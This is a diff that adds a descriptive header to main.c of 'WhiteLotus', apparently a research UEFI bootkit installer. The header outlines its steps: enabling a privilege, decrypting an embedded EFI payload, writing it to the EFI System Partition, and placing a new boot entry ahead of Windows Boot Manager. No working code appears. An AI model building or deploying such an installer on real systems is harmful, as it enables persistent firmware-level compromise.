@@ -1,3 +1,30 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows EFI Installer
+ *  File     : main.c
+ * ============================================================
+ *
+ *  Description:
+ *    User-mode EFI installer entry point. Enables the
+ *    SeSystemEnvironmentPrivilege, checks Secure Boot status,
+ *    RC4-decrypts the embedded EFI payload, locates the EFI
+ *    System Partition (ESP) by scanning GPT partition types,
+ *    writes the payload to ESP, creates a new UEFI boot
+ *    entry (Boot0009), and prepends it to BootOrder so the
+ *    driver is executed on the next reboot.
+ *
+ *  Purpose:
+ *    - Install the WhiteLotus UEFI DXE driver onto the EFI
+ *      System Partition and configure UEFI firmware to boot
+ *      it ahead of the Windows Boot Manager.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "main.h"
 #include "payload.h"
 
